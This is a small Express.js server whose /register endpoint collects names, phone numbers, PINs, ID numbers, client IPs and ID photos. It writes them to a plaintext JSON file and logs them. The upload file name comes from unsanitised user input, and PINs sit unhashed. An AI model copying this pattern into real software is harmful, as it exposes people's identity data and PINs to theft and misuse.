const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5050; 

app.use(express.static('public'));

const storage = multer.diskStorage({
  destination: './assets/',
  filename: (req, file, cb) => {
    cb(null, `${req.body.name.split(' ')[0]}_ID.jpg`);
  }
});
const upload = multer({ storage });


app.post('/register', upload.single('idImage'), (req, res) => {
  const { name, phone, pin, idNumber, ip, dateTime } = req.body;
  
  const newUser = {
    name,
    phone,
    pin,
    idNumber,
    ip,
    dateTime
  };

  fs.readFile('registration.json', 'utf8', (err, data) => {
    if (err && err.code === 'ENOENT') {
    
      console.log("File not found. Initializing new file.");
      data = '[]';
    } else if (err) {
      console.error("Error reading file:", err);
      return res.status(500).send("Error reading file.");
    }

    let users;
    try {
      users = JSON.parse(data);
    } catch (parseErr) {
      console.error("Error parsing JSON data:", parseErr);
      return res.status(500).send("Error parsing JSON.");
    }

    users.push(newUser);

    
    fs.writeFile('registration.json', JSON.stringify(users, null, 2), (writeErr) => {
      if (writeErr) {
        console.error("Error writing file:", writeErr);
        return res.status(500).send("Error saving user data.");
      }
      console.log("User registered successfully:", newUser);
      res.status(200).send("User registered successfully.");
    });
  });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
